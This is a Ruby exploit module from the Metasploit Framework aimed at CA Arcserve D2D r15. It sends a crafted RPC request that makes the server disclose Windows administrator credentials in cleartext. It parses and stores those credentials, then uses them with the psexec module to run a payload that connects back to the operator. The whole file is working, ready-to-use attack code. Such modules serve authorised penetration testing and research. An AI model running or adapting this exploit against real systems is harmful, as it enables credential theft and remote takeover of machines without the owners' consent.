##
# $Id: ca_arcserve_rpc_authbypass.rb 13467 2011-08-01 21:20:29Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA Arcserve D2D GWT RPC Credential Information Disclosure',
			'Description'    => %q{
					This module exploits an information disclosure vulnerability in the CA Arcserve
				D2D r15 web server. The information disclosure can be triggered by sending a
				specially crafted RPC request to the homepage servlet. This causes CA Arcserve to
				disclosure the username and password in cleartext used for authentication. This
				username and password pair are Windows credentials with Administrator access.
			},
			'Author'         =>
				[
					'bannedit', # metasploit module
					'rgod', # original public exploit
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 13467 $',
			'References'     =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/17574/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x0d\x0a",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DisclosureDate' => 'July 25 2011',
			'DefaultTarget' => 0))


		register_options(
			[
				Opt::RPORT(8014),
			], self.class )
	end

	def exploit
		print_status("Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}")

		data  = "5|0|4|"
		data << "http://#{datastore['RHOST']}:#{datastore['RPORT']}"
		data << "/contents/"
		data << "|2C6B33BED38F825C48AE73C093241510|"
		data << "com.ca.arcflash.ui.client.homepage.HomepageService"
		data << "|getLocalHost|1|2|3|4|0|"

		cookie = "donotshowgettingstarted=%7B%22state%22%3Atrue%7D"

		resp = send_request_raw({
			'uri'     => '/contents/service/homepage',
			'version' => '1.1',
			'method'  => 'POST',
			'cookie'  => cookie,
			'data'    => data,
			'headers' =>
			{
				'Content-Type'  => "text/x-gwt-rpc; charset=utf-8",
				'Content-Length' => data.length
			}
		}, 5)

		resp = resp.to_s.split(',')
		user = resp[resp.index("\"user\"")+1].gsub(/\"/, "")
		pass = resp[resp.index("\"password\"")+1].gsub(/\"/, "")

		# report the auth
		auth = {
				:host   => datastore['RHOST'],
				:port   => datastore['RPORT'],
				:sname  => 'ca.arcserver.d2d',
				:user   => user,
				:pass   => pass,
				:active => true
			}
		report_auth_info(auth)

		if user.nil? or pass.nil?
			print_error("Failed to collect the username and password")
			return
		end

		print_good("Collected credentials User: '#{user}' Password: '#{pass}'")

		# try psexec on the remote host
		psexec = framework.exploits.create("windows/smb/psexec")
		psexec.register_parent(self)

		psexec.datastore['PAYLOAD'] = self.datastore['PAYLOAD']

		if self.datastore['LHOST'] and self.datastore['LPORT']
			psexec.datastore['LHOST'] = self.datastore['LHOST']
			psexec.datastore['LPORT'] = self.datastore['LPORT']
		end

		psexec.datastore['RHOST'] = self.datastore['RHOST']

		psexec.datastore['DisablePayloadHandler'] = true
		psexec.datastore['SMBPass'] = pass
		psexec.datastore['SMBUser'] = user

		print_status("Attempting to login via windows/smb/psexec")

		# this is kind of nasty would be better to split psexec code out to a mixin (on the TODO List)
		begin
			psexec.exploit_simple(
				'LocalInput'  => self.user_input,
				'LocalOutput' => self.user_output,
				'Payload'  => psexec.datastore['PAYLOAD'],
				'RunAsJob' => true
			)
		rescue
			print_status("Login attempt using windows/smb/psexec failed")
			print_status("Credentials have been stored and may be useful for authentication against other services.")
			return
		end

		handler
	end
end